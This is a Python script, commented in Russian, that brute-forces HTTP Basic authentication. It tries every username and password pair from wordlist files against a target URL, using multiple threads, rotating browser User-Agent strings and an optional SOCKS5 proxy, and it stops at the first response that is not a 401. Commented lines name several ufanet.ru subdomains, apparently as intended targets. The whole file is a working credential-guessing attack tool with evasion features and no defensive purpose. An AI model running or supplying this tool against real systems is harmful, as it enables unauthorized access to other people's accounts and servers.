import os
import base64
import requests
import random
from time import time
from itertools import product
from concurrent.futures import ThreadPoolExecutor, as_completed
#prom.broken.ufanet.ru
#boco.ufanet.ru
#aladdin.ufanet.ru
# === Настройки цели и прокси ===
TARGET_URL = "https://example.com"  # Измени на свою цель
TIMEOUT = 10
MAX_THREADS = 10

# SOCKS5 proxy
#os.environ["HTTP_PROXY"] = "socks5h://127.0.0.1:2080"
#os.environ["HTTPS_PROXY"] = "socks5h://127.0.0.1:2080"

# === Реалистичные User-Agent заголовки ===
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.124 Mobile Safari/537.36",
]

# === Загрузка словарей ===
with open("usernames.txt") as f:
    usernames = [line.strip() for line in f if line.strip()]

with open("passwords.txt") as f:
    passwords = [line.strip() for line in f if line.strip()]

combos = list(product(usernames, passwords))
total = len(combos)
found = False
start = time()

print(f"🎯 Target: {TARGET_URL}")
print(f"📦 Combos: {total} | Threads: {MAX_THREADS} \n")

# === Основная функция брута ===
def try_login(username, password):
    global found
    if found:
        return

    creds = f"{username}:{password}"
    b64creds = base64.b64encode(creds.encode()).decode()
    headers = {
        "Authorization": f"Basic {b64creds}",
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
    }

    try:
        r = requests.get(TARGET_URL, headers=headers, timeout=TIMEOUT)

        if r.status_code != 401:
            found = True
            return (username, password, r.status_code)

    except Exception as e:
        return f"[!] Error for {creds}: {str(e)}"

# === Многопоточность с ThreadPoolExecutor ===
with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    futures = {
        executor.submit(try_login, u, p): (u, p)
        for u, p in combos
    }

    for i, future in enumerate(as_completed(futures), 1):
        result = future.result()
        u, p = futures[future]

        if isinstance(result, tuple):
            print(f"\n✅ SUCCESS! {result[0]}:{result[1]} → {result[2]}")
            break
        elif result:
            print(result)
        else:
            print(f"[{i}/{total}] Tried {u}:{p}")

if not found:
    print("\n❌ No valid credentials found.")
print(f"\n⏱ Total time: {round(time() - start, 2)} sec")
